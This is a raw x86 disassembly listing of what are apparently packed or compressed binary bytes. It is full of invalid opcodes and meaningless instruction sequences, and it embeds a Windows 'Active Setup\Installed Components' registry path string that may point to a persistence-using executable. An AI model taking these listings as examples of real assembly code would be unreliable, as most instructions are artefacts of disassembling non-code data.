1315b32f:	5b                   	pop    %ebx
1315b330:	75 68                	jne    0x1315b39a
1315b332:	3c 27                	cmp    $0x27,%al
1315b334:	0c e8                	or     $0xe8,%al
1315b336:	77 ca                	ja     0x1315b302
1315b338:	45                   	inc    %ebp
1315b339:	5b                   	pop    %ebx
1315b33a:	62 31                	bound  %esi,(%ecx)
1315b33c:	b0 b4                	mov    $0xb4,%al
1315b33e:	49                   	dec    %ecx
1315b33f:	ee                   	out    %al,(%dx)
1315b340:	17                   	pop    %ss
1315b341:	92                   	xchg   %eax,%edx
1315b342:	85 25 6a 15 ba 50    	test   %esp,0x50ba156a
1315b348:	42                   	inc    %edx
1315b349:	b6 53                	mov    $0x53,%dh
1315b34b:	87 80 b8 f2 78 39    	xchg   %eax,0x3978f2b8(%eax)
1315b351:	e9 86 64 e4 42       	jmp    0x55fa17dc
1315b356:	28 80 28 1b e7 92    	sub    %al,-0x6d18e4d8(%eax)
1315b35c:	49                   	dec    %ecx
1315b35d:	01 ea                	add    %ebp,%edx
1315b35f:	d7                   	xlat   %ds:(%ebx)
1315b360:	bb e4 d9 ea 9d       	mov    $0x9dead9e4,%ebx
1315b365:	00 c7                	add    %al,%bh
1315b367:	0d 96 29 72 2b       	or     $0x2b722996,%eax
1315b36c:	37                   	aaa
1315b36d:	b6 15                	mov    $0x15,%dh
1315b36f:	85 e9                	test   %ebp,%ecx
1315b371:	0d b4 70 4d 4e       	or     $0x4e4d70b4,%eax
1315b376:	d6                   	salc
1315b377:	4b                   	dec    %ebx
1315b378:	0f ce                	bswap  %esi
1315b37a:	2b 04 67             	sub    (%edi,%eiz,2),%eax
1315b37d:	73 a3                	jae    0x1315b322
1315b37f:	87 59 4a             	xchg   %ebx,0x4a(%ecx)
1315b382:	1c 4f                	sbb    $0x4f,%al
1315b384:	18 fa                	sbb    %bh,%dl
1315b386:	f0 70 c0             	lock jo 0x1315b349
1315b389:	c6                   	(bad)
1315b38a:	5e                   	pop    %esi
1315b38b:	90                   	nop
1315b38c:	fc                   	cld
1315b38d:	12 a0 0c 68 6f b2    	adc    -0x4d9097f4(%eax),%ah
1315b393:	0d 9b 0c 62 57       	or     $0x57620c9b,%eax
1315b398:	10 68 c2             	adc    %ch,-0x3e(%eax)
1315b39b:	df 92 91 10 14 0a    	fists  0xa141091(%edx)
1315b3a1:	b9 08 71 01 7a       	mov    $0x7a017108,%ecx
1315b3a6:	6f                   	outsl  %ds:(%esi),(%dx)
1315b3a7:	32 06                	xor    (%esi),%al
1315b3a9:	2c 45                	sub    $0x45,%al
1315b3ab:	3d 5e d9 85 9c       	cmp    $0x9c85d95e,%eax
1315b3b0:	30 15 14 fa 1c 1f    	xor    %dl,0x1f1cfa14
1315b3b6:	ac                   	lods   %ds:(%esi),%al
1315b3b7:	48                   	dec    %eax
1315b3b8:	f2 0c 24             	repnz or $0x24,%al
1315b3bb:	03 4d 43             	add    0x43(%ebp),%ecx
1315b3be:	63 34 26             	arpl   %esi,(%esi,%eiz,1)
1315b3c1:	b0 21                	mov    $0x21,%al
1315b3c3:	20 5a b1             	and    %bl,-0x4f(%edx)
1315b3c6:	5f                   	pop    %edi
1315b3c7:	71 43                	jno    0x1315b40c
1315b3c9:	4d                   	dec    %ebp
1315b3ca:	53                   	push   %ebx
1315b3cb:	66 bd 77 00          	mov    $0x77,%bp
1315b3cf:	61                   	popa
1315b3d0:	07                   	pop    %es
1315b3d1:	5c                   	pop    %esp
1315b3d2:	b3 cd                	mov    $0xcd,%bl
1315b3d4:	bd 04 15 69 00       	mov    $0x691504,%ebp
1315b3d9:	63 0b                	arpl   %ecx,(%ebx)
1315b3db:	17                   	pop    %ss
1315b3dc:	73 1b                	jae    0x1315b3f9
1315b3de:	bb cd dc 74 13       	mov    $0x1374dccd,%ebx
1315b3e3:	57                   	push   %edi
1315b3e4:	6e                   	outsb  %ds:(%esi),(%dx)
1315b3e5:	00 64 27 73          	add    %ah,0x73(%edi,%eiz,1)
1315b3e9:	0f 43 00             	cmovae (%eax),%eax
1315b3ec:	75 5d                	jne    0x1315b44b
1315b3ee:	f7 b9 75 21 2f 6e    	idivl  0x6e2f2175(%ecx)
1315b3f4:	1f                   	pop    %ds
1315b3f5:	56                   	push   %esi
1315b3f6:	07                   	pop    %es
1315b3f7:	72 17                	jb     0x1315b410
1315b3f9:	69 0c 46 4d d7 1f 6e 	imul   $0x6e1fd74d,(%esi,%eax,2),%ecx
1315b400:	1d 52 6e 5b 35       	sbb    $0x355b6e52,%eax
1315b405:	41                   	inc    %ecx
1315b406:	bb ff ff 6f 66       	mov    $0x666fffff,%ebx
1315b40b:	74 77                	je     0x1315b484
1315b40d:	61                   	popa
1315b40e:	72 65                	jb     0x1315b475
1315b410:	5c                   	pop    %esp
1315b411:	4d                   	dec    %ebp
1315b412:	69 63 72 6f 73 0d 5c 	imul   $0x5c0d736f,0x72(%ebx),%esp
1315b419:	41                   	inc    %ecx
1315b41a:	ff                   	(bad)
1315b41b:	ff                   	(bad)
1315b41c:	ff                   	(bad)
1315b41d:	bf af 76 65 20       	mov    $0x206576af,%edi
1315b422:	53                   	push   %ebx
1315b423:	65 74 75             	gs je  0x1315b49b
1315b426:	70 5c                	jo     0x1315b484
1315b428:	49                   	dec    %ecx
1315b429:	6e                   	outsb  %ds:(%esi),(%dx)
1315b42a:	73 74                	jae    0x1315b4a0
1315b42c:	61                   	popa
1315b42d:	6c                   	insb   (%dx),%es:(%edi)
1315b42e:	6c                   	insb   (%dx),%es:(%edi)
1315b42f:	65 64 20 43 6f       	gs and %al,%fs:0x6f(%ebx)
1315b434:	6d                   	insl   (%dx),%es:(%edi)
1315b435:	70 6f                	jo     0x1315b4a6
1315b437:	6e                   	outsb  %ds:(%esi),(%dx)
1315b438:	65 6e                	outsb  %gs:(%esi),(%dx)
1315b43a:	74 73                	je     0x1315b4af
1315b43c:	99                   	cltd
1315b43d:	b1 87                	mov    $0x87,%cl
1315b43f:	1e                   	push   %ds
1315b440:	b7 af                	mov    $0xaf,%bh
1315b442:	20 65 73             	and    %ah,0x73(%ebp)
1315b445:	54                   	push   %esp
1315b446:	f7 3d f7 9f 74 11    	idivl  0x11749ff7
1315b44c:	17                   	pop    %ss
1315b44d:	b7 74                	mov    $0x74,%bh
1315b44f:	65 62 2c 88          	bound  %ebp,%gs:(%eax,%ecx,4)
1315b453:	6d                   	insl   (%dx),%es:(%edi)
1315b454:	ae                   	scas   %es:(%edi),%al
1315b455:	5f                   	pop    %edi
1315b456:	17                   	pop    %ss
1315b457:	09 68 17             	or     %ebp,0x17(%eax)
1315b45a:	87 e4                	xchg   %esp,%esp
1315b45c:	80 4c f2 41 71       	orb    $0x71,0x41(%edx,%esi,8)
1315b461:	7c 48                	jl     0x1315b4ab
1315b463:	71 39                	jno    0x1315b49e
1315b465:	ab                   	stos   %eax,%es:(%edi)
1315b466:	4e                   	dec    %esi
1315b467:	86 7c e8 2f          	xchg   %bh,0x2f(%eax,%ebp,8)
1315b46b:	e4 56                	in     $0x56,%al
1315b46d:	cb                   	lret
1315b46e:	59                   	pop    %ecx
1315b46f:	d1 9f f1 f8 01 c5    	rcrl   $1,-0x3afe070f(%edi)
1315b475:	2e 9a c5 d1 ec 03 3d 	cs lcall $0xa43d,$0x3ecd1c5
1315b47c:	a4 
1315b47d:	af                   	scas   %es:(%edi),%eax
1315b47e:	58                   	pop    %eax
1315b47f:	88 58 6a             	mov    %bl,0x6a(%eax)
1315b482:	a9 53 c1 08 1c       	test   $0x1c08c153,%eax
1315b487:	b4 b2                	mov    $0xb2,%ah
1315b489:	cc                   	int3
1315b48a:	20 64 88 46          	and    %ah,0x46(%eax,%ecx,4)
1315b48e:	63 4d 6f             	arpl   %ecx,0x6f(%ebp)
1315b491:	8c fc                	mov    %?,%esp
1315b493:	c7                   	(bad)
1315b494:	39 a2 bf 7c 8f 2c    	cmp    %esp,0x2c8f7cbf(%edx)
1315b49a:	f8                   	clc
1315b49b:	f8                   	clc
1315b49c:	b3 01                	mov    $0x1,%bl
1315b49e:	80 3d c8 34 80 89 8a 	cmpb   $0x8a,0x898034c8
1315b4a5:	10 d2                	adc    %dl,%dl
1315b4a7:	29 bf 00 95 5b 20    	sub    %edi,0x205b9500(%edi)
1315b4ad:	40                   	inc    %eax
1315b4ae:	38 c2                	cmp    %al,%dl
1315b4b0:	c4 3b                	les    (%ebx),%edi
1315b4b2:	d6                   	salc
1315b4b3:	7d 07                	jge    0x1315b4bc
1315b4b5:	6f                   	outsl  %ds:(%esi),(%dx)
1315b4b6:	05 9b 8a 66 54       	add    $0x54668a9b,%eax
1315b4bb:	eb 07                	jmp    0x1315b4c4
1315b4bd:	31 77 66             	xor    %esi,0x66(%edi)
1315b4c0:	89 7b c3             	mov    %edi,-0x3d(%ebx)
1315b4c3:	0b c1                	or     %ecx,%eax
1315b4c5:	08 46 a7             	or     %al,-0x59(%esi)
1315b4c8:	81 fe e9 ca 75 e2    	cmp    $0xe275cae9,%esi
1315b4ce:	be 0a 19 bb 44       	mov    $0x44bb190a,%esi
1315b4d3:	30 b7 bf a0 b3 35    	xor    %dh,0x35b3a0bf(%edi)
1315b4d9:	d0 76 34             	shlb   $1,0x34(%esi)
1315b4dc:	0a b1 99 81 06 50    	or     0x50068199(%ecx),%dh
1315b4e2:	5d                   	pop    %ebp
1315b4e3:	09 11                	or     %edx,(%ecx)
1315b4e5:	76 d4                	jbe    0x1315b4bb
1315b4e7:	62 cf 61             	(bad) {bad}
1315b4ea:	a8 0c                	test   $0xc,%al
1315b4ec:	09 fe                	or     %edi,%esi
1315b4ee:	76 4d                	jbe    0x1315b53d
1315b4f0:	e8 1c f5 85 6e       	call   0x819baa11
1315b4f5:	97                   	xchg   %eax,%edi
1315b4f6:	c3                   	ret
1315b4f7:	80 05 74 09 81 c7 69 	addb   $0x69,0xc7810974
1315b4fe:	8a 6c 88 85          	mov    -0x7b(%eax,%ecx,4),%ch
1315b502:	4c                   	dec    %esp
1315b503:	b8 c5 d4 07 d7       	mov    $0xd707d4c5,%eax
1315b508:	0b 74 08 43          	or     0x43(%eax,%ecx,1),%esi
1315b50c:	07                   	pop    %es
1315b50d:	54                   	push   %esp
1315b50e:	68 19 39 93 1b       	push   $0x1b933919
1315b513:	17                   	pop    %ss
1315b514:	00 d5                	add    %dl,%ch
1315b516:	04 eb                	add    $0xeb,%al
1315b518:	90                   	nop
1315b519:	68 01 7b e5 3e       	push   $0x3ee57b01
1315b51e:	04 1e                	add    $0x1e,%al
1315b520:	41                   	inc    %ecx
1315b521:	c7                   	(bad)
1315b522:	51                   	push   %ecx
1315b523:	1c 07                	sbb    $0x7,%al
1315b525:	30 ec                	xor    %ch,%ah
1315b527:	41                   	inc    %ecx
1315b528:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315b529:	08 5f 04             	or     %bl,0x4(%edi)
1315b52c:	10 3c b7             	adc    %bh,(%edi,%esi,4)
1315b52f:	2b 3e                	sub    (%esi),%edi
1315b531:	33 c8                	xor    %eax,%ecx
1315b533:	72 9c                	jb     0x1315b4d1
1315b535:	0b c0                	or     %eax,%eax
1315b537:	a1 36 82 2e dd       	mov    0xdd2e8236,%eax
1315b53c:	5c                   	pop    %esp
1315b53d:	08 40 86             	or     %al,-0x7a(%eax)
1315b540:	a0 58 3b 8a c7       	mov    0xc78a3b58,%al
1315b545:	83 a1 2b 19 3a 4c b7 	andl   $0xffffffb7,0x4c3a192b(%ecx)
1315b54c:	d5 53                	aad    $0x53
1315b54e:	35 11 28 82 55       	xor    $0x55822811,%eax
1315b553:	7a 53                	jp     0x1315b5a8
1315b555:	3b b2 b1 ef 75 82    	cmp    -0x7d8a104f(%edx),%esi
1315b55b:	53                   	push   %ebx
1315b55c:	cc                   	int3
1315b55d:	4e                   	dec    %esi
1315b55e:	06                   	push   %es
1315b55f:	89 6a 8d             	mov    %ebp,-0x73(%edx)
1315b562:	e4 df                	in     $0xdf,%al
1315b564:	b7 99                	mov    $0x99,%bh
1315b566:	ec                   	in     (%dx),%al
1315b567:	2f                   	das
1315b568:	ba 82 b8 87 89       	mov    $0x8987b882,%edx
1315b56d:	74 24                	je     0x1315b593
1315b56f:	04 58                	add    $0x58,%al
1315b571:	76 c9                	jbe    0x1315b53c
1315b573:	ee                   	out    %al,(%dx)
1315b574:	52                   	push   %edx
1315b575:	83 40 73 3a          	addl   $0x3a,0x73(%eax)
1315b579:	7b 85                	jnp    0x1315b500
1315b57b:	05 76 a0 6d 77       	add    $0x776da076,%eax
1315b580:	95                   	xchg   %eax,%ebp
1315b581:	b3 1f                	mov    $0x1f,%bl
1315b583:	fa                   	cli
1315b584:	83 6a 80 3c          	subl   $0x3c,-0x80(%edx)
1315b588:	34 66                	xor    $0x66,%al
1315b58a:	11 10                	adc    %edx,(%eax)
1315b58c:	6a 10                	push   $0x10
1315b58e:	0c 35                	or     $0x35,%al
1315b590:	84 dd                	test   %bl,%ch
1315b592:	6e                   	outsb  %ds:(%esi),(%dx)
1315b593:	64 7d 04             	fs jge 0x1315b59a
1315b596:	1a eb                	sbb    %bl,%ch
1315b598:	55                   	push   %ebp
1315b599:	1c 7c                	sbb    $0x7c,%al
1315b59b:	84 0c 58             	test   %cl,(%eax,%ebx,2)
1315b59e:	07                   	pop    %es
1315b59f:	b0 38                	mov    $0x38,%al
1315b5a1:	39 74 04 ec          	cmp    %esi,-0x14(%esp,%eax,1)
1315b5a5:	40                   	inc    %eax
1315b5a6:	ba 1c 1b 0e 39       	mov    $0x390e1b1c,%edx
1315b5ab:	10 20                	adc    %ah,(%eax)
1315b5ad:	26 11 01             	adc    %eax,%es:(%ecx)
1315b5b0:	77 e1                	ja     0x1315b593
1315b5b2:	12 80 c6 44 fb c3    	adc    -0x3c04bb3a(%eax),%al
1315b5b8:	db c3                	fcmovnb %st(3),%st
1315b5ba:	3a 22                	cmp    (%edx),%ah
1315b5bc:	0e                   	push   %cs
1315b5bd:	0e                   	push   %cs
1315b5be:	08 b9 18 51 8e 40    	or     %bh,0x408e5118(%ecx)
1315b5c4:	84 08                	test   %cl,(%eax)
1315b5c6:	a3 cb e4 f9 52       	mov    %eax,0x52f9e4cb
1315b5cb:	34 17                	xor    $0x17,%al
1315b5cd:	88 a1 94 fb fe 40    	mov    %ah,0x40fefb94(%ecx)
1315b5d3:	e1 0e                	loope  0x1315b5e3
1315b5d5:	ba 15 2a ef 03       	mov    $0x3ef2a15,%edx
1315b5da:	45                   	inc    %ebp
1315b5db:	fe                   	(bad)
1315b5dc:	24 55                	and    $0x55,%al
1315b5de:	13 cb                	adc    %ebx,%ecx
1315b5e0:	1c 57                	sbb    $0x57,%al
1315b5e2:	51                   	push   %ecx
1315b5e3:	91                   	xchg   %eax,%ecx
1315b5e4:	fc                   	cld
1315b5e5:	b4 52                	mov    $0x52,%ah
1315b5e7:	33 b3 d2 ba 0f d4    	xor    -0x2bf0452e(%ebx),%esi
1315b5ed:	24 0d                	and    $0xd,%al
1315b5ef:	d8 10                	fcoms  (%eax)
1315b5f1:	6f                   	outsl  %ds:(%esi),(%dx)
1315b5f2:	56                   	push   %esi
1315b5f3:	f8                   	clc
1315b5f4:	3d f3 dc 87 67       	cmp    $0x6787dcf3,%eax
1315b5f9:	7c c5                	jl     0x1315b5c0
1315b5fb:	97                   	xchg   %eax,%edi
1315b5fc:	8a d2                	mov    %dl,%dl
1315b5fe:	8a 80 8f ad 24 85    	mov    -0x7adb5271(%eax),%al
1315b604:	57                   	push   %edi
1315b605:	75 b1                	jne    0x1315b5b8
1315b607:	23 74 5b a0          	and    -0x60(%ebx,%ebx,2),%esi
1315b60b:	1d 17 18 19 4c       	sbb    $0x4c191817,%eax
1315b610:	21 06                	and    %eax,(%esi)
1315b612:	d8 ff                	fdivr  %st(7),%st
1315b614:	ff cb                	dec    %ebx
1315b616:	00 05 1f 49 1b 4e    	add    %al,0x4e1b491f
1315b61c:	4a                   	dec    %edx
1315b61d:	24 3e                	and    $0x3e,%al
1315b61f:	43                   	inc    %ebx
1315b620:	55                   	push   %ebp
1315b621:	50                   	push   %eax
1315b622:	23 19                	and    (%ecx),%ebx
1315b624:	4d                   	dec    %ebp
1315b625:	06                   	push   %es
1315b626:	54                   	push   %esp
1315b627:	3f                   	aas
1315b628:	22 3d 00 00 fa ff    	and    0xfffa0000,%bh
1315b62e:	db 41 20             	fildl  0x20(%ecx)
1315b631:	e9 08 09 0a 0b       	jmp    0x1e1fbf3e
1315b636:	0c 0d                	or     $0xd,%al
1315b638:	0e                   	push   %cs
1315b639:	0f 10 11             	movups (%ecx),%xmm2
1315b63c:	07                   	pop    %es
1315b63d:	01 1a                	add    %ebx,(%edx)
1315b63f:	1c ff                	sbb    $0xff,%al
1315b641:	b7 fa                	mov    $0xfa,%bh
1315b643:	b7 34                	mov    $0x34,%bh
1315b645:	25 30 36 37 38       	and    $0x38373630,%eax
1315b64a:	39 3a                	cmp    %edi,(%edx)
1315b64c:	bf 26 27 28 29       	mov    $0x29282726,%edi
1315b651:	2a 2b                	sub    (%ebx),%ch
1315b653:	2c 2d                	sub    $0x2d,%al
1315b655:	2e 2f                	cs das
1315b657:	7e 24                	jle    0x1315b67d
1315b659:	0f fb 31             	psubq  (%ecx),%mm6
1315b65c:	32 33                	xor    (%ebx),%dh
1315b65e:	34 35                	xor    $0x35,%al
1315b660:	44                   	inc    %esp
1315b661:	4b                   	dec    %ebx
1315b662:	52                   	push   %edx
1315b663:	42                   	inc    %edx
1315b664:	4f                   	dec    %edi
1315b665:	44                   	inc    %esp
1315b666:	51                   	push   %ecx
1315b667:	89 b0 ff c1 0a 57    	mov    %esi,0x570ac1ff(%eax)
1315b66d:	56                   	push   %esi
1315b66e:	58                   	pop    %eax
1315b66f:	45                   	inc    %ebp
1315b670:	47                   	inc    %edi
1315b671:	48                   	dec    %eax
1315b672:	46                   	inc    %esi
1315b673:	40                   	inc    %eax
1315b674:	41                   	inc    %ecx
1315b675:	85 5b 0b             	test   %ebx,0xb(%ebx)
1315b678:	d2 6c 0b 17          	shrb   %cl,0x17(%ebx,%ecx,1)
1315b67c:	15 ea 08 12 d9       	adc    $0xd91208ea,%eax
1315b681:	6c                   	insb   (%dx),%es:(%edi)
1315b682:	b7 3f                	mov    $0x3f,%bh
1315b684:	16                   	push   %ss
1315b685:	1e                   	push   %ds
1315b686:	bd 83 0c bb 76       	mov    $0x76bb0c83,%ebp
1315b68b:	03 e1                	add    %ecx,%esp
1315b68d:	07                   	pop    %es
1315b68e:	77 a6                	ja     0x1315b636
1315b690:	69 9a 66 2d 53 79 9f 	imul   $0xd34dc59f,0x79532d66(%edx),%ebx
1315b697:	c5 4d d3 
1315b69a:	2c 9b                	sub    $0x9b,%al
1315b69c:	eb 11                	jmp    0x1315b6af
1315b69e:	78 37                	js     0x1315b6d7
1315b6a0:	5d                   	pop    %ebp
1315b6a1:	83 a9 9a 65 d3 34 cf 	subl   $0xffffffcf,0x34d3659a(%ecx)
1315b6a8:	f5                   	cmc
1315b6a9:	1b 79 41             	sbb    0x41(%ecx),%edi
1315b6ac:	67 6c                	insb   (%dx),%es:(%di)
1315b6ae:	9a a6 69 8d b3 d9 ff 	lcall  $0xffd9,$0xb38d69a6
1315b6b5:	25 7a d3 34 4d       	and    $0x4d34d37a,%eax
1315b6ba:	b3 4b                	mov    $0x4b,%bl
1315b6bc:	71 97                	jno    0x1315b655
1315b6be:	bd e3 a6 69 9a       	mov    $0x9a69a6e3,%ebp
1315b6c3:	65 09 7b 2f          	or     %edi,%gs:0x2f(%ebx)
1315b6c7:	55                   	push   %ebp
1315b6c8:	7b a1                	jnp    0x1315b66b
1315b6ca:	4d                   	dec    %ebp
1315b6cb:	b3 6c                	mov    $0x6c,%bl
1315b6cd:	9a c7 ed 13 7c 39 5f 	lcall  $0x5f39,$0x7c13edc7
1315b6d4:	85 96 4d d3 34 ab    	test   %edx,-0x54cb2cb3(%esi)
1315b6da:	d1 f7                	shl    $1,%edi
1315b6dc:	1d 7d 43 6c 9a       	sbb    $0x9a6c437d,%eax
1315b6e1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315b6e2:	69 69 8f b5 db 01 7e 	imul   $0x7e01dbb5,-0x71(%ecx),%ebp
1315b6e9:	d3 34 4d b3 27 4d 73 	shll   %cl,0x734d27b3(,%ecx,2)
1315b6f0:	99                   	cltd
1315b6f1:	bf a6 69 96 4d       	mov    $0x4d9669a6,%edi
1315b6f6:	e5 0b                	in     $0xb,%eax
1315b6f8:	7f 31                	jg     0x1315b72b
1315b6fa:	57                   	push   %edi
1315b6fb:	7d cd                	jge    0x1315b6ca
1315b6fd:	b2 69                	mov    $0x69,%dl
1315b6ff:	9a a3 c9 ef 15 80 3b 	lcall  $0x3b80,$0x15efc9a3
1315b706:	61                   	popa
1315b707:	36 4d                	ss dec %ebp
1315b709:	d3 34 87             	shll   %cl,(%edi,%eax,4)
1315b70c:	ad                   	lods   %ds:(%esi),%eax
1315b70d:	d3 f9                	sar    %cl,%ecx
1315b70f:	1f                   	pop    %ds
1315b710:	81 69 9a a6 59 45 6b 	subl   $0x6b4559a6,-0x66(%ecx)
1315b717:	91                   	xchg   %eax,%ecx
1315b718:	b7 dd                	mov    $0xdd,%bh
1315b71a:	d3 34 cd b2 03 82 29 	shll   %cl,0x298203b2(,%ecx,8)
1315b721:	4f                   	dec    %edi
1315b722:	75 9b                	jne    0x1315b6bf
1315b724:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315b725:	59                   	pop    %ecx
1315b726:	36 4d                	ss dec %ebp
1315b728:	c1 e7 0d             	shl    $0xd,%edi
1315b72b:	83 33 56             	xorl   $0x56,(%ebx)
1315b72e:	fe                   	(bad)
1315b72f:	28 61 9a             	sub    %ah,-0x66(%ecx)
1315b732:	79 9c                	jns    0x1315b6d0
1315b734:	1e                   	push   %ds
1315b735:	b7 b8                	mov    $0xb8,%bh
1315b737:	9c                   	pushf
1315b738:	85 18                	test   %ebx,(%eax)
1315b73a:	f4                   	hlt
1315b73b:	7e 24                	jle    0x1315b761
1315b73d:	71 63                	jno    0x1315b7a2
1315b73f:	cc                   	int3
1315b740:	57                   	push   %edi
1315b741:	8d b5 10 9f 32 d8    	lea    -0x27cd60f0(%ebp),%esi
1315b747:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315b748:	6a dc                	push   $0xffffffdc
1315b74a:	73 b9                	jae    0x1315b705
1315b74c:	25 b4 32 01 32       	and    $0x320132b4,%eax
1315b751:	01 cc                	add    %ecx,%esp
1315b753:	e4 39                	in     $0x39,%al
1315b755:	01 32                	add    %esi,(%edx)
1315b757:	01 fc                	add    %edi,%esp
1315b759:	08 86 99 00 39 00    	or     %al,0x390099(%esi)
1315b75f:	1c 34                	sbb    $0x34,%al
1315b761:	99                   	cltd
1315b762:	00 99 00 38 3c 99    	add    %bl,-0x66c3c800(%ecx)
1315b768:	00 99 00 40 44 99    	add    %bl,-0x66bbc000(%ecx)
1315b76e:	00 99 00 48 4c 99    	add    %bl,-0x66b3b800(%ecx)
1315b774:	00 99 00 50 54 99    	add    %bl,-0x66abb000(%ecx)
1315b77a:	00 99 00 58 5c 99    	add    %bl,-0x66a3a800(%ecx)
1315b780:	00 99 00 74 84 99    	add    %bl,-0x667b8c00(%ecx)
1315b786:	00 99 00 98 a8 99    	add    %bl,-0x66576800(%ecx)
1315b78c:	00 99 00 b8 cc 99    	add    %bl,-0x66334800(%ecx)
1315b792:	00 99 00 d4 e8 1c    	add    %bl,0x1ce8d400(%ecx)
1315b798:	80 9c 00 00 87 04 4c 	sbbb   $0x80,0x4c048700(%eax,%eax,1)
1315b79f:	80 
1315b7a0:	4c                   	dec    %esp
1315b7a1:	80 1c 28 4c          	sbbb   $0x4c,(%eax,%ebp,1)
1315b7a5:	80 4c 80 38 4c       	orb    $0x4c,0x38(%eax,%eax,4)
1315b7aa:	4c                   	dec    %esp
1315b7ab:	80 4c 80 6c 84       	orb    $0x84,0x6c(%eax,%eax,4)
1315b7b0:	4c                   	dec    %esp
1315b7b1:	80 4c 80 98 b4       	orb    $0xb4,-0x68(%eax,%eax,4)
1315b7b6:	4c                   	dec    %esp
1315b7b7:	80 4c 80 c0 cc       	orb    $0xcc,-0x40(%eax,%eax,4)
1315b7bc:	4c                   	dec    %esp
1315b7bd:	80 4c 80 d8 e4       	orb    $0xe4,-0x28(%eax,%eax,4)
1315b7c2:	4c                   	dec    %esp
1315b7c3:	80 4c 80 f0 fc       	orb    $0xfc,-0x10(%eax,%eax,4)
1315b7c8:	0e                   	push   %cs
1315b7c9:	40                   	inc    %eax
1315b7ca:	4e                   	dec    %esi
1315b7cb:	80 08 88             	orb    $0x88,(%eax)
1315b7ce:	14 26                	adc    $0x26,%al
1315b7d0:	40                   	inc    %eax
1315b7d1:	26 40                	es inc %eax
1315b7d3:	20 2c 26             	and    %ch,(%esi,%eiz,1)
1315b7d6:	40                   	inc    %eax
1315b7d7:	26 40                	es inc %eax
1315b7d9:	38 44 26 40          	cmp    %al,0x40(%esi,%eiz,1)
1315b7dd:	26 40                	es inc %eax
1315b7df:	50                   	push   %eax
1315b7e0:	5c                   	pop    %esp
1315b7e1:	26 40                	es inc %eax
1315b7e3:	26 40                	es inc %eax
1315b7e5:	68 74 26 40 26       	push   $0x26402674
1315b7ea:	40                   	inc    %eax
1315b7eb:	80 8c 26 40 26 40 98 	orb    $0xa4,-0x67bfd9c0(%esi,%eiz,1)
1315b7f2:	a4 
1315b7f3:	26 40                	es inc %eax
1315b7f5:	26 40                	es inc %eax
1315b7f7:	b0 bc                	mov    $0xbc,%al
1315b7f9:	26 40                	es inc %eax
1315b7fb:	26 40                	es inc %eax
1315b7fd:	c8 d4 26 40          	enter  $0x26d4,$0x40
1315b801:	26 40                	es inc %eax
1315b803:	e0 f0                	loopne 0x1315b7f5
1315b805:	07                   	pop    %es
1315b806:	20 27                	and    %ah,(%edi)
1315b808:	40                   	inc    %eax
1315b809:	00 89 14 13 20 13    	add    %cl,0x13201314(%ecx)
1315b80f:	20 24 34             	and    %ah,(%esp,%esi,1)
1315b812:	13 20                	adc    (%eax),%esp
1315b814:	13 20                	adc    (%eax),%esp
1315b816:	4c                   	dec    %esp
1315b817:	68 13 20 13 20       	push   $0x20132013
1315b81c:	80 9c 13 20 13 20 bc 	sbbb   $0xe0,-0x43dfece0(%ebx,%edx,1)
1315b823:	e0 
1315b824:	13 20                	adc    (%eax),%esp
1315b826:	13 20                	adc    (%eax),%esp
1315b828:	f0 0c 09             	lock or $0x9,%al
1315b82b:	90                   	nop
1315b82c:	03 90 8a 24 09 90    	add    -0x6ff6db76(%eax),%edx
1315b832:	09 90 3c 4c 09 90    	or     %edx,-0x6ff6b3c4(%eax)
1315b838:	09 90 5c 70 09 90    	or     %edx,-0x6ff68fa4(%eax)
1315b83e:	09 90 8c a8 09 90    	or     %edx,-0x6ff65774(%eax)
1315b844:	09 90 c0 dc 47 c8    	or     %edx,-0x37b82340(%eax)
1315b84a:	09 90 ec 0c 8b eb    	or     %edx,-0x1474f314(%eax)
1315b850:	90                   	nop
1315b851:	2b 64 b0 67          	sub    0x67(%eax,%esi,4),%esp
1315b855:	22 24 44             	and    (%esp,%eax,2),%ah
1315b858:	64 90                	fs nop
1315b85a:	2b 64 40 21          	sub    0x21(%eax,%eax,2),%esp
1315b85e:	5c                   	pop    %esp
1315b85f:	e2 93                	loop   0x1315b7f4
1315b861:	10 29                	adc    %ch,(%ecx)
1315b863:	b6 73                	mov    $0x73,%dh
1315b865:	80 3d c4 23 08 b6 2b 	cmpb   $0x2b,0xb60823c4
1315b86c:	a2 75 6a 13 26       	mov    %al,0x26136a75
1315b871:	24 0a                	and    $0xa,%al
1315b873:	57                   	push   %edi
1315b874:	a0 d7 89 3a 7d       	mov    0x7d3a89d7,%al
1315b879:	de cb                	fmulp  %st,%st(3)
1315b87b:	3e c4 b0 76 4b 1e b8 	les    %ds:-0x47e1b48a(%eax),%esi
1315b882:	78 57                	js     0x1315b8db
1315b884:	1b f6                	sbb    %esi,%esi
1315b886:	40                   	inc    %eax
1315b887:	f0 0c ec             	lock or $0xec,%al
1315b88a:	d7                   	xlat   %ds:(%ebx)
1315b88b:	0f 27                	(bad)
1315b88d:	4b                   	dec    %ebx
1315b88e:	21 83 fd 77 23 b3    	and    %eax,-0x4cdc8803(%ebx)
1315b894:	01 7d 88             	add    %edi,-0x78(%ebp)
1315b897:	15 81 21 9e ea       	adc    $0xea9e2181,%eax
1315b89c:	50                   	push   %eax
1315b89d:	18 0c 5b             	sbb    %cl,(%ebx,%ebx,2)
1315b8a0:	d3 55 2f             	rcll   %cl,0x2f(%ebp)
1315b8a3:	70 0e                	jo     0x1315b8b3
1315b8a5:	19 ab fb 07 c4 db    	sbb    %ebp,-0x243bf805(%ebx)
1315b8ab:	02 17                	add    (%edi),%dl
1315b8ad:	fc                   	cld
1315b8ae:	04 7d                	add    $0x7d,%al
1315b8b0:	9b                   	fwait
1315b8b1:	e0 a6                	loopne 0x1315b859
1315b8b3:	e0 61                	loopne 0x1315b916
1315b8b5:	58                   	pop    %eax
1315b8b6:	53                   	push   %ebx
1315b8b7:	0f 8e 92 6c be 40    	jle    0x53d4254f
1315b8bd:	d3 01                	roll   %cl,(%ecx)
1315b8bf:	5d                   	pop    %ebp
1315b8c0:	80 f6 bf             	xor    $0xbf,%dh
1315b8c3:	bd f0 92 42 1c       	mov    $0x1c4292f0,%ebp
1315b8c8:	58                   	pop    %eax
1315b8c9:	f0 b2 cb             	lock mov $0xcb,%dl
1315b8cc:	75 32                	jne    0x1315b900
1315b8ce:	6b 95 2f 78 50 cd 11 	imul   $0x11,-0x32af87d1(%ebp),%edx
1315b8d5:	47                   	inc    %edi
